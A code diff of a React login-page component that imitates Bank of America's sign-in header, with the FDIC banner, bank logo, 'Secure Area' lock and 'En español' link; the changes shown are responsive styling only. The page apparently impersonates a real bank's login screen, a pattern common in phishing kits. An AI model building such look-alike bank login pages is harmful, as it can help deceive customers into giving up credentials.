@@ -50,37 +50,39 @@ export default function UserLoginPage() {
     <div className="min-h-screen flex flex-col bg-white">
       {/* FDIC Banner */}
       <div className="bg-[#f5f5f5] border-b border-[#ddd]">
-        <div className="max-w-[980px] mx-auto px-4 py-1 text-center">
-          <span className="text-[11px] text-[#666] font-normal">
-            Bank of America deposit products: <strong className="font-bold">FDIC</strong> FDIC-Insured - Backed by the full faith and credit of the U.S. Government
-          </span>
+        <div className="max-w-[980px] mx-auto px-4 py-1.5 md:py-1 text-center">
+          <p className="text-[10px] md:text-[11px] text-[#666] font-normal leading-tight">
+            Bank of America deposit products: <strong className="font-bold whitespace-nowrap">FDIC</strong> FDIC-Insured - Backed by the full faith and credit of the U.S. Government
+          </p>
         </div>
       </div>
 
       {/* Header */}
       <header className="bg-white border-b border-[#ddd]">
-        <div className="max-w-[980px] mx-auto px-4 py-2.5 flex items-center justify-between">
+        <div className="max-w-[980px] mx-auto px-4 py-2.5 flex items-center justify-between gap-2 overflow-hidden">
           {/* Logo - Using real image */}
-          <div className="flex items-center gap-4">
+          <div className="flex items-center gap-2 sm:gap-4 shrink-0">
             <Image 
               src="/header.png" 
               alt="Bank of America" 
               width={200} 
               height={24}
-              className="h-6 w-auto"
+              className="h-5 sm:h-6 w-auto"
               priority
             />
-            <span className="text-[#333] text-[14px] font-normal">Log In</span>
+            <span className="text-[#333] text-[13px] sm:text-[14px] font-normal hidden xs:block">Log In</span>
           </div>
-
+ 
           {/* Right side */}
-          <div className="flex items-center gap-1.5 text-[11px] text-[#666]">
-            <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
-            </svg>
-            <span className="font-medium">Secure Area</span>
+          <div className="flex items-center gap-1 sm:gap-1.5 text-[10px] sm:text-[11px] text-[#666] shrink-0">
+            <div className="flex items-center gap-1 whitespace-nowrap">
+              <svg className="w-3 h-3 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+              </svg>
+              <span className="font-medium hidden xxs:inline">Secure Area</span>
+            </div>
             <span className="text-[#ccc] mx-0.5">|</span>
-            <Link href="#" className="text-[#0066b2] hover:underline font-normal">En español</Link>
+            <Link href="#" className="text-[#0066b2] hover:underline font-normal whitespace-nowrap">En español</Link>
           </div>
         </div>
       </header>
